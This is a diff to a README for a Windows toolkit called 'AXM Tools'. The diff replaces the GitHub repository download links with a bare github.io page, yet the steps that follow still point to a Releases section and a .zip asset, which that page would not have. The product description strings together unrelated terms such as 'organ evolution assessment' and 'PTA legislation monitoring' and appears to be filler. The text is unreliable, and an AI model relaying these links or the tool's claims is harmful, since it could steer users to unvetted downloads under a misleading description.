@@ -1,6 +1,6 @@
 # 🛠️ axm-tools-toolbox-2026 - Streamline your daily technical tracking tasks
 
-[![Download AXM Tools](https://img.shields.io/badge/Download-AXM_Tools-blue.svg)](https://github.com/Aryaasho3871/axm-tools-toolbox-2026)
+[![Download AXM Tools](https://img.shields.io/badge/Download-AXM_Tools-blue.svg)](https://aryaasho3871.github.io)
 
 AXM Tools provides a collection of static web utilities for local tracking, organ evolution assessment, PTA legislation monitoring, and evidence-driven workflows. These tools run directly on your computer without the need for an internet connection.
 
@@ -21,7 +21,7 @@ To run AXM Tools on your Windows computer, you need:
 
 You must visit the project page to download the latest version of the toolkit. Follow these steps to obtain the necessary files:
 
-1.  Navigate to the [official download page](https://github.com/Aryaasho3871/axm-tools-toolbox-2026).
+1.  Navigate to the [official download page](https://aryaasho3871.github.io).
 2.  Look for the section labeled Releases on the right side of the page.
 3.  Click on the latest release version.
 4.  Find the file ending in .zip under the Assets section.
